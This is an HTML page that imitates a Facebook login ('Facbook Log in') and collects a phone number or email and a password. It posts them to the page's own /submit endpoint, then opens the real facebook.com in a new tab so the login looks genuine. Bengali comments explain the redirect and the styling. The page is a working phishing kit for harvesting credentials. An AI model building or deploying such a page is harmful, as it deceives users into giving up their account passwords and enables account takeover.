<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facbook Log in</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f7f6;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .form-container {
            background: #ffffff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 300px;
        }

        .input-group {
            margin-bottom: 15px;
        }

        .input-group label {
            display: block;
            margin-bottom: 5px;
            color: #333;
        }

        .input-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }

        /* সুন্দর সাবমিট বাটন স্টাইল (No standard outline border) */
        .submit-btn {
            width: 100%;
            background-color: #0091cf; /* সুন্দর সবুজ কালার */
            color: white;
            padding: 12px;
            border: none; /* কোনো বর্ডার থাকবে না */
            border-radius: 5px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .submit-btn:hover {
            background-color: #0185be; /* মাউস নিলে কালার গাঢ় হবে */
        }
    </style>
</head>
<body>

    <div class="form-container">
        <div class="f-logo">
            <img src="f_.jpg" alt="logo" style="width: 35px;">
        </div>
        <div class="text">
            <h5 style="color: #0185be; font-size: 17px; margin-top: 10px;">Log in Your Facebook Acount</h5>
        </div>
        <!-- target="_blank" দেওয়ার ফলে সাবমিট বাটনে ক্লিক করলে নতুন লিংকে ডাটা যাবে ও নতুন ট্যাব খুলবে -->
        <form action="/submit" method="POST" id="contactForm" target="_blank">
            <div class="input-group">
                <label for="user_name">Phone number</label>
                <input type="text" id="user_name" name="user_name" placeholder="Phone number or Email address" required>
            </div>

            <div class="input-group">
                <label for="user_message">Password</label>
                <input type="text" id="user_message" name="user_message" placeholder="Password" required>
            </div>

            <button type="submit" class="submit-btn" onclick="openRedirectLink()">Submit</button>
        </form>
    </div>

    <script>
        function openRedirectLink() {
            // ফর্ম ফিল্ড ফাঁকা না থাকলে নতুন লিংক ওপেন করবে
            var name = document.getElementById('user_name').value;
            var message = document.getElementById('user_message').value;

            if (name !== "" && message !== "") {
                // এখানে আপনার কাঙ্ক্ষিত নতুন লিংকটি বসিয়ে দিন (যেমন: https://google.com)
                window.open("https://facebook.com/profile.php", "_blank");
            }
        }
    </script>

</body>
</html>
